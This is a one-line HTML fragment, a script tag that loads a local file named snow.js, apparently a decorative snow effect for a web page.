<script  type="text/javascript" src="\js\snow.js"></script>

